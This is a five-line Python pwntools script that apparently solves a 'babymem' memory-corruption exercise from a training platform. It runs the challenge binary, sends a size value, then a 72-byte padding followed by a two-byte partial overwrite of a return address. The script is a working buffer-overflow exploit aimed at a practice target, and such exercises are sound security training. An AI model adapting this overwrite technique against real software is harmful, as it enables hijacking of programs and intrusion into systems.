import pwn
r = pwn.process("/challenge/babymem_level7.1")
r.sendline("1024")
r.send(b'\x00'*72+b'\x84\xb6') #8c6bb684
print(r.readall())
